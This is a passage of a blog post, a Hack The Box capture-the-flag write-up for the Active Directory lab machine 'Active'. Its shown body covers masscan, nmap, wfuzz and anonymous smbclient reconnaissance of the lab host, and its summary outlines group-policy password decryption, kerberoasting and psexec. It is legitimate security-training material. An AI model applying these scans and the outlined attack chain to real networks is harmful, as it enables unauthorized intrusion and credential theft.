@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.51" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - Active | text/plain</title>
+    <meta name="description" content="Write-up for the machine Active from Hack The Box.
+The machine is a very interesting exercise for those who do not work with
+Active Directory domain controllers every day but want to dive deeper into
+their inner workings. Basically, you find one such domain controller with
+plenty of open ports. After a short distraction in form of a web server with no
+content, you find that you get unauthenticated access to an SMB share with some
+group policy files in it. Inside, you find an encrypted password. It is easy to
+decrypt though since the key is public information. With these credentials, you
+get not only the first flag but also access to the AD itself. Searching for
+server principal names reveals that the Administrator account is
+kerberoastable. With impacket and john, it is easy to crack the password of
+this account. Now the root flag is only one execution of psexec away.
+">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - Active" />
+<meta property="og:description" content="Write-up for the machine Active from Hack The Box.
+The machine is a very interesting exercise for those who do not work with
+Active Directory domain controllers every day but want to dive deeper into
+their inner workings. Basically, you find one such domain controller with
+plenty of open ports. After a short distraction in form of a web server with no
+content, you find that you get unauthenticated access to an SMB share with some
+group policy files in it. Inside, you find an encrypted password. It is easy to
+decrypt though since the key is public information. With these credentials, you
+get not only the first flag but also access to the AD itself. Searching for
+server principal names reveals that the Administrator account is
+kerberoastable. With impacket and john, it is easy to crack the password of
+this account. Now the root flag is only one execution of psexec away.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_active/" /><meta property="article:published_time" content="2018-12-20T00:00:00&#43;01:00"/>
+<meta property="article:modified_time" content="2018-12-20T00:00:00&#43;01:00"/>
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_active/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - Active">
+<meta itemprop="description" content="Write-up for the machine Active from Hack The Box.
+The machine is a very interesting exercise for those who do not work with
+Active Directory domain controllers every day but want to dive deeper into
+their inner workings. Basically, you find one such domain controller with
+plenty of open ports. After a short distraction in form of a web server with no
+content, you find that you get unauthenticated access to an SMB share with some
+group policy files in it. Inside, you find an encrypted password. It is easy to
+decrypt though since the key is public information. With these credentials, you
+get not only the first flag but also access to the AD itself. Searching for
+server principal names reveals that the Administrator account is
+kerberoastable. With impacket and john, it is easy to crack the password of
+this account. Now the root flag is only one execution of psexec away.
+">
+
+
+<meta itemprop="datePublished" content="2018-12-20T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2018-12-20T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="2381">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Active</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>12 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2018-12-20T00:00:00&#43;01:00">20 Dec, 2018</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine Active from Hack The Box.
+The machine is a very interesting exercise for those who do not work with
+Active Directory domain controllers every day but want to dive deeper into
+their inner workings. Basically, you find one such domain controller with
+plenty of open ports. After a short distraction in form of a web server with no
+content, you find that you get unauthenticated access to an SMB share with some
+group policy files in it. Inside, you find an encrypted password. It is easy to
+decrypt though since the key is public information. With these credentials, you
+get not only the first flag but also access to the AD itself. Searching for
+server principal names reveals that the Administrator account is
+kerberoastable. With impacket and john, it is easy to crack the password of
+this account. Now the root flag is only one execution of psexec away.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scan">Port scan</a></li>
+<li><a href="#web-server">Web server</a></li>
+<li><a href="#smb-shares">SMB shares</a></li>
+</ul></li>
+<li><a href="#being-svc-tgs">Being SVC_TGS</a>
+<ul>
+<li><a href="#checking-smb-again">Checking SMB again</a></li>
+<li><a href="#enumerating-active-directory">Enumerating Active Directory</a></li>
+<li><a href="#kerberoasting">Kerberoasting</a></li>
+</ul></li>
+<li><a href="#administrator-with-psexec">Administrator with psexec</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>We start as usual with a quick <code>masscan</code> to get open ports as fast as possible.
+It returns lots of results:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>$ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.100
+ 
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-09-13 20:54:40 GMT
+-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 53/tcp on 10.10.10.100
+Discovered open port 9389/tcp on 10.10.10.100
+Discovered open port 88/tcp on 10.10.10.100
+Discovered open port 445/tcp on 10.10.10.100
+Discovered open port 464/tcp on 10.10.10.100
+Discovered open port 49171/tcp on 10.10.10.100
+Discovered open port 3268/tcp on 10.10.10.100
+Discovered open port 49169/tcp on 10.10.10.100
+Discovered open port 49182/tcp on 10.10.10.100
+Discovered open port 5722/tcp on 10.10.10.100
+Discovered open port 49158/tcp on 10.10.10.100
+Discovered open port 49153/tcp on 10.10.10.100
+Discovered open port 593/tcp on 10.10.10.100
+Discovered open port 389/tcp on 10.10.10.100
+Discovered open port 49155/tcp on 10.10.10.100
+Discovered open port 47001/tcp on 10.10.10.100
+Discovered open port 636/tcp on 10.10.10.100
+Discovered open port 49152/tcp on 10.10.10.100
+Discovered open port 135/tcp on 10.10.10.100
+Discovered open port 3269/tcp on 10.10.10.100
+Discovered open port 139/tcp on 10.10.10.100
+Discovered open port 49154/tcp on 10.10.10.100
+Discovered open port 49157/tcp on 10.10.10.100
+</code></pre></div>
+
+<p>Use <code>nmap</code> to get more details on the services running on these ports:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -p <span style="color: #ae81ff">53</span>,9389,88,445,464,49171,3268,49169,49182,5722,49158,49153,593,389,49155,47001,636,49152,135,3269,139,49154,49157 <span style="color: #ae81ff">10</span>.10.10.100
+...
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows
+Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-09-13 21:01:03Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+49182/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -3s, deviation: 0s, median: -3s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2018-09-13 17:02:01
+|_  start_date: 2018-09-09 17:20:40
+</code></pre></div>
+
+<p>This looks a lot like an Active Directory domain controller. We can see a
+Windows host with LDAP, Kerberos and plenty of RPC ports. Moreover, there is a
+web server on 47001. Checking it out with a browser returns a 404 and nothing
+else. Lastly, we have ports 139 and 445 open, which means we should look for
+SMB shares. Also note that nmap returned the name of the domain, which is
+&ldquo;active.htb&rdquo;.</p>
+
+<h2 id="web-server">Web server</h2>
+
+<p>Before doing anything else, I ran a scan on the web server to check if there
+are any hidden files or directories:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ wfuzz --hc<span style="color: #f92672">=</span><span style="color: #ae81ff">404</span> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.100:47001/FUZZ
+</code></pre></div>
+
+<p>To my disappointment, the scan did not deliver any results. Nevertheless, it
+does not hurt to have it running and to proceed with manual enumeration after
+that.</p>
+
+<h2 id="smb-shares">SMB shares</h2>
+
+<p>SMB is a <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/microsoft-smb-protocol-and-cifs-protocol-overview">file sharing protocol</a>
+and the primary means by which Windows computers let other machines access
+files remotely. We can try to use <code>nmap</code> scripts to extract some information
+about possible vulnerabilities out of it:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -p <span style="color: #ae81ff">445</span> --script vuln <span style="color: #ae81ff">10</span>.10.10.100
+...
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR:
+Server disconnected the connection
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server
+disconnected the connection
+...
+</code></pre></div>
+
+<p>This did not help too much. Maybe I was a bit too quick with this, so let&rsquo;s
+step back and just connect with <code>smbclient</code>:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ smbclient -L <span style="color: #ae81ff">10</span>.10.10.100
+Enter WORKGROUP\root&#39;s password:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+</code></pre></div>
+
